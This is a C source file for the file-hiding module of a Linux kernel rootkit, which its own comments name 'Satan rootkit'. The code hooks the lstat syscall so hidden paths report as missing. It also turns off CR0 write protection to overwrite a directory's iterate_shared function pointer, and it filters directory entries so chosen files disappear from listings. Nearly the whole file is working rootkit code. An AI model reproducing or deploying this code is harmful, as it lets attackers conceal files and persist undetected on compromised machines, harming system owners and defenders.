// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "file.h"

#include <linux/fs.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "syscall.h"
#include "util.h"


/* Buffers for basename and filename, placed in .bss for performance reason */
#define BASENAME_BUF_SIZE 128
#define FILENAME_BUF_SIZE 128
static char basename_buf[BASENAME_BUF_SIZE] = {0};
static char filename_buf[BASENAME_BUF_SIZE] = {0};



struct hidden_file;  // forward declaration
static int satan_file_hook_iterate_shared(struct hidden_file *f);
static int satan_file_unhook_iterate_shared(const struct hidden_file *f);



/* Hidden file information and related functions */
struct hidden_file {
        char *fullpath;  // fullpath = basename + '/' + filename
        char *basename;
        char *filename;
        struct list_head list;
};
static LIST_HEAD(hidden_files_list);  // list of hidden files.

static struct hidden_file *hidden_files_list_get(const char *path);
static int hidden_files_list_add(const char *path, struct hidden_file **buf);
static int hidden_files_list_del(const char *path);



typedef int (*iterate_shared_t)(struct file *, struct dir_context *);

/* The original iterate_shared() of a directory is stored in this struct. */
struct dir_iterate_shared {
        char *basename;
        iterate_shared_t real_iterate_shared;
        struct list_head list;
};
static LIST_HEAD(real_iterate_shared_list);  // list of original iterate_shared()

static iterate_shared_t real_iterate_shared_list_get(const char *basename);
static void real_iterate_shared_list_add(const char *basename, void *iterate_shared);
static void real_iterate_shared_list_clear(void);



/* Satan rootkit's malicious hooks for hiding files. */
static int satan_iterate_shared(struct file *filp, struct dir_context *ctx);
static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                         loff_t offset, u64 ino, unsigned d_type);



/* sys_lstat64 is hooked in satan_file_init() */
asmlinkage int (*real_lstat64)(const char __user *filename,
                               struct stat __user *statbuf);

static int dummy = 0;

asmlinkage long satan_lstat64(const char __user *filename,
                              struct stat __user *statbuf)
{
        // Uninitialized for the sake of performance.
        struct hidden_file *f;
        struct list_head *ptr;

        dummy = strncpy_from_user(filename_buf, filename, FILENAME_BUF_SIZE);
       
        list_for_each(ptr, &hidden_files_list) {
                f = list_entry(ptr, struct hidden_file, list);

                if (!strncmp(filename_buf, f->fullpath, strlen(f->fullpath))) {
                        return -ENOENT;
                }
        }

        real_lstat64 = (void *) satan_syscall_get_original(__NR_lstat);
        return real_lstat64(filename, statbuf);
}



int satan_file_init(void)
{
        return satan_syscall_hook(__NR_lstat, satan_lstat64);
}

void satan_file_exit(void)
{
        struct hidden_file *f = NULL;
        struct list_head *ptr = NULL;
        struct list_head *tmp = NULL;

        // Unhide the files that are left hidden by the user.
        list_for_each_safe(ptr, tmp, &hidden_files_list) {
                f = list_entry(ptr, struct hidden_file, list);
                satan_file_unhook_iterate_shared(f);

                pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
                list_del(ptr);
                kfree(f->fullpath);
                kfree(f->basename);
                kfree(f->filename);
                kfree(f);
        }
      
        satan_syscall_unhook(__NR_lstat);
        real_iterate_shared_list_clear();
}

/**
 * satan_file_hide() - Hides a file by absolute path.
 * @path: the ABSOLUTE PATH to the target file.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_file_hide(const char *path)
{
        struct hidden_file *f = NULL;

        // If a struct hidden_file is successfully added into
        // hidden_files_list, then hidden_files_list_add() will
        // return 0 and place the address of the newly added
        // struct hidden_file in f.
        if (hidden_files_list_add(path, &f) != 0) {
                return 1;
        }

        return satan_file_hook_iterate_shared(f);
}

/**
 * satan_file_unhide() - Unhides a hidden file by absolute path.
 * @path: the ABSOLUTE PATH to the hidden file.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_file_unhide(const char *path)
{
        struct hidden_file *f = hidden_files_list_get(path);

        if (!f) {
                pr_alert("satan: file: %s has not been hidden before\n", path);
                return 1;
        }

        // Unhooking iterate_shared() requires the existence of f,
        // and hidden_files_list_del() will kfree(f).
        // Therefore, we should only del f from the list
        // after unhooking iterate_shared(), otherwise
        // there will be a use-after-free bug.
        if (satan_file_unhook_iterate_shared(f) != 0) {
                return 1;
        }

        return hidden_files_list_del(path);
}



static struct hidden_file *hidden_files_list_get(const char *path)
{
        // Uninitialized for the sake of performance.
        struct hidden_file *f;
        struct list_head *ptr;

        memset(basename_buf, 0, BASENAME_BUF_SIZE);
        memset(filename_buf, 0, FILENAME_BUF_SIZE);
        satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
        satan_filename(path, filename_buf, FILENAME_BUF_SIZE);

        list_for_each(ptr, &hidden_files_list) {
                f = list_entry(ptr, struct hidden_file, list);

                if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, filename_buf)) {
                        return f;
                }
        }

        return NULL;
}

static int hidden_files_list_add(const char *path, struct hidden_file **buf)
{
        int ret = 0;
        struct hidden_file *f = hidden_files_list_get(path);

        if (f) {
                pr_alert("satan: file: %s is already hidden\n", path);
                ret = 1;
                goto out;
        }


        memset(basename_buf, 0, BASENAME_BUF_SIZE);
        memset(filename_buf, 0, FILENAME_BUF_SIZE);
        satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
        satan_filename(path, filename_buf, FILENAME_BUF_SIZE);

        f = (struct hidden_file*) kmalloc(sizeof(struct hidden_file), GFP_KERNEL);
        f->fullpath = kzalloc(strlen(path) + 1, GFP_KERNEL);
        f->basename = kzalloc(strlen(basename_buf) + 1, GFP_KERNEL);
        f->filename = kzalloc(strlen(filename_buf) + 1, GFP_KERNEL);

        strcpy(f->fullpath, path);
        strcpy(f->basename, basename_buf);
        strcpy(f->filename, filename_buf);

        pr_info("satan: file: adding (%s,%s) to list of hidden files.\n", f->basename, f->filename);
        list_add_tail(&(f->list), &hidden_files_list);

out:
        if (buf)
                *buf = f;

        return ret;
}

static int hidden_files_list_del(const char *path)
{
        struct hidden_file *f = hidden_files_list_get(path);

        if (!f) {
                pr_alert("satan: file: %s has not been hidden\n", path);
                return 1;
        }


        pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
        list_del(&(f->list));
        kfree(f->fullpath);
        kfree(f->basename);
        kfree(f->filename);
        kfree(f);
        return 0;
}



static iterate_shared_t real_iterate_shared_list_get(const char *basename)
{
        // Uninitialized for the sake of performance.
        struct dir_iterate_shared *dir_is;
        struct list_head *ptr;

        list_for_each(ptr, &real_iterate_shared_list) {
                dir_is = list_entry(ptr, struct dir_iterate_shared, list);

                if (!strncmp(basename, dir_is->basename, strlen(dir_is->basename))) {
                        return dir_is->real_iterate_shared;
                }
        }

        return NULL;
}

static void real_iterate_shared_list_add(const char *basename, void *iterate_shared)
{
        struct dir_iterate_shared *dir_is = NULL;

        dir_is = (struct dir_iterate_shared *) kmalloc(sizeof(struct dir_iterate_shared), GFP_KERNEL);
        dir_is->basename = kzalloc(strlen(basename) + 1, GFP_KERNEL);
        dir_is->real_iterate_shared = iterate_shared;
        strcpy(dir_is->basename, basename);

        list_add_tail(&(dir_is->list), &real_iterate_shared_list);
}

static void real_iterate_shared_list_clear(void)
{
        struct dir_iterate_shared *dir_is = NULL;
        struct list_head *ptr = NULL;
        struct list_head *tmp = NULL;

        list_for_each_safe(ptr, tmp, &real_iterate_shared_list) {
                dir_is = list_entry(ptr, struct dir_iterate_shared, list);

                list_del(ptr);
                kfree(dir_is->basename);
                kfree(dir_is);
        }
}



/**
 * satan_file_hook_iterate_shared() - hooks the `iterate_shared()` function pointer
 * of the specified file's parent directory.
 *
 * @hidden_file: the information wrapper of a hidden file.
 *
 * Return: zero on success and non-zero otherwise.
 */
static int satan_file_hook_iterate_shared(struct hidden_file *f)
{ 
        int ret = 0;
        struct file *filp = NULL;
        struct file_operations *f_op = NULL;

        if (!f) {
                pr_err("satan: file: hook_iterate_shared(f): f is NULL.\n");
                return 1;
        }


        filp = filp_open(f->basename, O_RDONLY, 0);

        if (IS_ERR(filp)) {
                pr_alert("satan: file: failed to open %s\n", f->basename);
                ret = 1;
                goto out;
        }

        f_op = (struct file_operations *) filp->f_op;

        // If we haven't memorized the real iterate_shared() of this directory,
        // add it to the list.
        if (!real_iterate_shared_list_get(f->basename))
                real_iterate_shared_list_add(f->basename, f_op->iterate_shared);


        CR0_WP_DISABLE {
                pr_info("satan: iterate_shared: %p\n", f_op->iterate_shared);
                pr_alert("satan: hijacking iterate from %p to %p.\n",
                                f_op->iterate_shared, satan_iterate_shared);
                f_op->iterate_shared = satan_iterate_shared;
        } CR0_WP_DISABLE_END

out:
        if (filp)
                filp_close(filp, NULL);

        return ret;
}

/**
 * satan_file_unhook_iterate_shared() - Unhooks the `iterate_shared()` function pointer
 * of the specified file's parent directory.
 *
 * @hidden_file: the information wrapper of a hidden file.
 *
 * Return: zero on success and non-zero otherwise.
 */
static int satan_file_unhook_iterate_shared(const struct hidden_file *f)
{
        int ret = 0;
        struct file *filp = NULL;
        struct file_operations *f_op = NULL;
        iterate_shared_t real_iterate_shared = NULL;

        if (!f) {
                pr_err("satan: file: hook_iterate_shared(f): f is NULL.\n");
                return 1;
        }


        filp = filp_open(f->basename, O_RDONLY, 0);

        if (IS_ERR(filp)) {
                pr_alert("satan: satan: failed to open %s:\n", f->basename);
                ret = 1;
                goto out;
        }


        f_op = (struct file_operations *) filp->f_op;
        real_iterate_shared = real_iterate_shared_list_get(f->basename);

        CR0_WP_DISABLE {
                pr_info("satan: restoring iterate_shared from %p to %p\n",
                        f_op->iterate_shared, real_iterate_shared);
                f_op->iterate_shared = real_iterate_shared;
        } CR0_WP_DISABLE_END

out:
        if (filp)
                filp_close(filp, NULL);

        return ret;
}



/* These variables are used in both satan_iterate_shared() and satan_filldir() */
static char *basename = NULL;
static filldir_t real_filldir = NULL;  

static int satan_iterate_shared(struct file *filp, struct dir_context *ctx)
{
        // Uninitialized for the sake of performance.
        int ret;
        iterate_shared_t real_iterate_shared;

        // Get the absolute path of `filp` via `d_path()`.
        // I've tried `dentry_path_raw()` but it always returns a wrong path :(
        memset(basename_buf, 0, BASENAME_BUF_SIZE);
        basename = d_path(&filp->f_path, basename_buf, BASENAME_BUF_SIZE);

        // Get the real iterate_shared() of this directory from `real_iterate_shared_list`
        // which will be invoked very soon.
        real_iterate_shared = real_iterate_shared_list_get(basename);
        
        // real_iterate_shared can really be NULL.. not sure why.. yet.
        if (!real_iterate_shared) {
                return -1;
        }


        // ->iterate_shared() will call ctx->actor, i.e., filldir()
        // Here we'll replace the original filldir() with our version of filldir().
        real_filldir = ctx->actor;
        *(filldir_t *)&ctx->actor = satan_filldir;
        ret = real_iterate_shared(filp, ctx);
        *(filldir_t *)&ctx->actor = real_filldir;

        return ret;
}

static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                         loff_t offset, u64 ino, unsigned d_type)
{
        // Uninitialized for the sake of performance.
        struct hidden_file *f;
        struct list_head *ptr;

        list_for_each(ptr, &hidden_files_list) {
                f = list_entry(ptr, struct hidden_file, list);

                // At this point:
                // 1. Current basename is stored in `basename`.
                // 2. Current filename is stored in `name`.
                if (!strcmp(f->basename, basename) && !strcmp(f->filename, name)) {
                        pr_info("satan: file: hiding: %s", name);
                        return 0;
                }
        }

        // Let the original filldir() finish its job.
        return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
